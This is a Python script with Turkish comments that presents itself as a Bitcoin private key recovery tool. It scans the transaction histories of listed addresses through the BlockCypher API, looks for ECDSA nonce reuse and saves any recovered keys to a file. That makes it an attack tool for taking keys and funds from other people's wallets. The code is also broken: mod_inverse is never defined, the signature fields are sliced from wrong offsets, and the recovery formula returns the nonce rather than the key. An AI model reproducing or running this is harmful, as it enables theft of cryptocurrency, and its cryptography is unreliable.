import argparse
import requests
import time

# Sabitler
SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141  # secp256k1 prime order

# BlockCypher API'den işlem bilgilerini çekme
def fetch_transactions(address):
    url = f"https://api.blockcypher.com/v1/btc/main/addrs/{address}/full"
    try:
        response = requests.get(url)
        response.raise_for_status()  # HTTP hatası varsa hata fırlatır
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Adres {address} için işlem bilgisi çekilemedi: {e}")
        return None

# İşlem detaylarından imza bilgilerini çıkarma
def extract_signature_data(tx):
    inputs = tx.get("inputs", [])
    if not inputs:
        return []

    signatures = []
    for inp in inputs:
        script = inp.get("script", "")
        if script and len(script) >= 130:
            try:
                r = int(script[:64], 16)
                s = int(script[64:128], 16)
                z = int(script[128:192], 16)  # Örnek, hash doğrulama için düzenlenebilir
                signatures.append({"r": r, "s": s, "z": z})
            except ValueError:
                continue
    return signatures

# Aynı r değerine sahip işlemleri tespit et ve private key kurtar
def find_and_recover_private_keys(transactions):
    signature_map = {}
    private_keys = []

    for tx in transactions:
        sigs = extract_signature_data(tx)
        for sig in sigs:
            r = sig["r"]
            if r in signature_map:
                existing_sig = signature_map[r]
                # Aynı r değerine sahip imzalar bulundu
                private_key = recover_private_key(
                    r,
                    existing_sig["s"],
                    sig["s"],
                    existing_sig["z"],
                    sig["z"],
                    SECP256K1_N,
                )
                if private_key:
                    print(f"Aynı nonce (r) tespit edildi! Private Key: {hex(private_key)}")
                    private_keys.append(private_key)
            else:
                # İlk kez görülen r değeri
                signature_map[r] = sig

    return private_keys

# Private key kurtarma fonksiyonu
def recover_private_key(r, s1, s2, z1, z2, n):
    try:
        s_diff = (s1 - s2) % n
        z_diff = (z1 - z2) % n
        s_diff_inv = mod_inverse(s_diff, n)
        private_key = (z_diff * s_diff_inv) % n
        return private_key
    except ValueError:
        print("Modüler ters hesaplaması başarısız oldu!")
        return None

# Ana program
def main():
    parser = argparse.ArgumentParser(description="Bitcoin Private Key Recovery Tool")
    parser.add_argument("-a", "--address_file", required=True, help="Bitcoin adreslerinin bulunduğu dosya")
    args = parser.parse_args()

    address_file = args.address_file
    found_addresses = []

    # Adresler dosyasını oku
    try:
        with open(address_file, "r") as file:
            addresses = [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print(f"{address_file} dosyası bulunamadı.")
        return

    for address in addresses:
        print(f"Adres: {address} için işlem bilgileri çekiliyor...")
        data = fetch_transactions(address)

        if not data:
            print(f"{address} adresi için işlem bulunamadı veya API hatası.")
            continue  # Bu adresi atla, bir sonraki adrese geç

        # İşlemleri al
        transactions = data.get("txs", [])
        if not transactions:
            print(f"{address} adresi için işlem geçmişi bulunamadı.")
            continue  # Bu adresi atla, bir sonraki adrese geç

        print(f"{len(transactions)} işlem bulundu. İşlem geçmişi taranıyor...")
        private_keys = find_and_recover_private_keys(transactions)

        if private_keys:
            print(f"{len(private_keys)} adet private key kurtarıldı.")
            found_addresses.append(address)
            with open("found.txt", "a") as f:
                for key in private_keys:
                    f.write(f"Adres: {address}, Private Key: {hex(key)}\n")

        time.sleep(5)  # API'ye aşırı yük binmesini engellemek için 5 saniye bekle

    if found_addresses:
        print(f"{len(found_addresses)} adres için private key bulundu. Bilgiler 'found.txt' dosyasına kaydedildi.")
    else:
        print("Hiçbir private key bulunamadı.")

if __name__ == "__main__":
    main()
